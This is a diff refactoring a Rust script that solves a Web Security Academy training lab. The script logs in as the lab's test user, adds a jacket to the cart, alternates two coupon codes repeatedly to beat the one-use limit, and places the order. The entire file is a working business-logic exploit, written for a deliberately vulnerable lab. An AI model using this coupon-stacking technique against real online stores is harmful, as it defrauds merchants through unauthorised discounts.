@@ -1,30 +1,23 @@
-/*************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 26/10/2023
+/********************************************************************************
 *
 * Lab: Flawed enforcement of business rules
 *
-* Steps: 1. Fetch the login page
-*        2. Extract the csrf token and session cookie
-*        3. Login as wiener
-*        4. Add the leather jacket to the cart
-*        5. Fetch wiener's cart
-*        6. Extract the csrf token needed for applying coupons and placing order
-*        7. Apply the coupons one after another repeatedly for a few times
-*        8. Place order
-*        9. Confirm order
+* Hack Steps: 
+*      1. Fetch the login page
+*      2. Extract the csrf token and session cookie
+*      3. Login as wiener
+*      4. Add the leather jacket to the cart
+*      5. Fetch wiener's cart
+*      6. Extract the csrf token needed for applying coupons and placing order
+*      7. Apply the coupons one after another repeatedly for a few times
+*      8. Place order
+*      9. Confirm order
 *
-**************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*********************************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use select::{document::Document, predicate::Attr};
@@ -35,67 +28,116 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a69002b0493eaa081ac1b20005000c3.web-security-academy.net";
+
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
+}
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0ade009e03cacb5e80ef082b00e60071.web-security-academy.net";
+    print!("⦗1⦘ Fetching the login page.. ");
+    flush_terminal();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let login_page = fetch("/login");
 
-    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
-    io::stdout().flush();
+    println!("{}", "OK".green());
+    print!("{}", "⦗2⦘ Extracting the csrf token and session cookie.. ",);
+    flush_terminal();
 
-    // fetch the login page
-    let login_page = client
-        .get(format!("{url}/login"))
+    let mut session = get_session_cookie(&login_page);
+    let mut csrf_token = get_csrf_token(login_page);
+
+    println!("{}", "OK".green());
+    print!("⦗3⦘ Logging in as wiener.. ",);
+    flush_terminal();
+
+    let login_as_wiener = login_as_wiener(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗4⦘ Adding the leather jacket to the cart.. ",);
+    flush_terminal();
+
+    session = get_session_cookie(&login_as_wiener);
+    add_leather_jacket_to_cart(&session);
+
+    println!("{}", "OK".green());
+    print!("⦗5⦘ Fetching wiener's cart.. ",);
+    flush_terminal();
+
+    let wiener_cart = fetch_with_session("/cart", &session);
+
+    println!("{}", "OK".green());
+    print!("⦗6⦘ Extracting the csrf token needed for applying coupons and placing order.. ",);
+    flush_terminal();
+
+    csrf_token = get_csrf_token(wiener_cart);
+
+    println!("{}", "OK".green());
+
+    // apply the coupons one after another repeatedly for a few times
+    for counter in 1..9 {
+        let mut coupon = "NEWCUST5";
+        if counter % 2 != 0 {
+            apply_coupon(coupon, &session, &csrf_token);
+        } else {
+            coupon = "SIGNUP30";
+            apply_coupon(coupon, &session, &csrf_token);
+        }
+        print!(
+            "\r⦗7⦘ Applying the coupon {} ({counter}/8).. ",
+            coupon.yellow(),
+        );
+        flush_terminal();
+    }
+
+    println!("{}", "OK".green());
+    print!("⦗8⦘ Placing order.. ",);
+    flush_terminal();
+
+    place_order(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗9⦘ Confirming order.. ",);
+    flush_terminal();
+
+    fetch_with_session("/cart/order-confirmation?order-confirmed=true", &session);
+
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn build_web_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
+
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
         .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
 
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗2⦘ Extracting the csrf token and session cookie.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract session cookie
-    let mut session = extract_session_cookie(login_page.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    let mut csrf =
-        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
-    io::stdout().flush();
-
-    // login as wiener
-    let login = client
-        .post(format!("{url}/login"))
+fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
             ("username", "wiener"),
             ("password", "peter"),
-            ("csrf", &csrf),
+            ("csrf", &csrf_token),
         ]))
         .send()
-        .expect(&format!("{}", "[!] Failed to login as wiener".red()));
+        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
+}
 
-    // extract session cookie of wiener
-    session = extract_session_cookie(login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗4⦘ Adding the leather jacket to the cart.. ".white(),);
-    io::stdout().flush();
-
-    // add the leather jacket to the cart
-    client
-        .post(format!("{url}/cart"))
+fn add_leather_jacket_to_cart(session: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/cart"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
             ("productId", "1"),
@@ -105,147 +147,61 @@ fn main() {
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to add the leather jacket to the cart".red()
-        ));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗5⦘ Fetching wiener's cart.. ".white(),);
-    io::stdout().flush();
-
-    // fetch wiener's cart
-    let wiener_cart = client
-        .get(format!("{url}/cart"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch wiener's cart".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗6⦘ Extracting the csrf token needed for applying coupons and placing order.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract the csrf token needed for placing order
-    csrf = extract_csrf(wiener_cart).expect(&format!(
-        "{}",
-        "[!] Failed to extract the csrf token needed for applying coupons and placing order".red()
-    ));
-
-    println!("{}", "OK".green());
-
-    // the variable that will hold the current coupone to apply
-    let mut coupon = "";
-
-    // apply the coupons one after another repeatedly for a few times
-    for counter in 1..9 {
-        if counter % 2 != 0 {
-            // apply the first coupon when the counter has an odd value
-            coupon = "NEWCUST5";
-        } else {
-            // apply the second coupon when the counter has an even value
-            coupon = "SIGNUP30";
-        }
-
-        print!(
-            "\r{} {} ({counter}/8).. ",
-            "⦗7⦘ Applying the coupon".white(),
-            coupon.yellow(),
-        );
-        io::stdout().flush();
-
-        // apply the coupon
-        client
-            .post(format!("{url}/cart/coupon"))
-            .header("Cookie", format!("session={session}"))
-            .form(&HashMap::from([("coupon", coupon), ("csrf", &csrf)]))
-            .send()
-            .expect(&format!("{}", "[!] Failed to apply the coupon".red()));
-    }
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗8⦘ Placing order.. ".white(),);
-    io::stdout().flush();
-
-    // place order
-    client
-        .post(format!("{url}/cart/checkout"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([("csrf", &csrf)]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to place order".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗9⦘ Confirming order.. ".white(),);
-    io::stdout().flush();
-
-    /*
-        confirm order to mark the lab as solved.
-        without this request the leather jacket will be purchased
-        and your credit will be decreased but the lab will sill be unsolved
-    */
-    client
-        .get(format!(
-            "{url}/cart/order-confirmation?order-confirmed=true"
+            "⦗!⦘ Failed to add the leather jacket to the cart with a modified price".red()
         ))
+}
+
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
         .header("Cookie", format!("session={session}"))
         .send()
-        .expect(&format!("{}", "[!] Failed to place order".red()));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as".white(),
-        "solved".green()
-    )
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
-    ClientBuilder::new()
-        .redirect(Policy::none())
-        .connect_timeout(Duration::from_secs(5))
-        .build()
-        .unwrap()
+fn apply_coupon(coupon: &str, session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/cart/coupon"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([("coupon", coupon), ("csrf", &csrf_token)]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to apply the coupon".red()))
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn place_order(session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/cart/checkout"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([("csrf", &csrf_token)]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to place order".red()))
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
